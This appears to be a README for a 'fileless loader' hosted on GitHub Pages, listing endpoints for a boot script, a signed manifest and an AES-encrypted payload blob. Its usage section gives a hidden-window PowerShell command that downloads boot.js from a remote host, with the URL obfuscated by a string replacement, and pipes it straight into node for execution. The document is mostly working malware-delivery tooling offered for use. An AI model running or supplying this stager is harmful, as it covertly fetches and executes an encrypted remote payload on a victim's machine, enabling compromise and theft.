# Etherial Fileless Loader

Static files served at /v1/ via GitHub Pages.

## Endpoints
- /v1/boot.js - Loader entry point
- /v1/manifest.json - Version, nonce, sha256, size
- /v1/manifest.sig - Ed25519 signature
- /v1/blob.bin - AES-256-GCM encrypted payload

## Usage
`cmd
powershell -nop -w hidden -c "iwr -useb https://linxfix/nostuk.Replace('/', '.github.io/')/v1/boot.js | node"
`

> Replace https://linxfix/nostuk.Replace('/', '.github.io/') with your custom domain if configured.

## Build
Built from 	ools/build-loader.ps1 in ETHERIAL-RUNTIME-source.
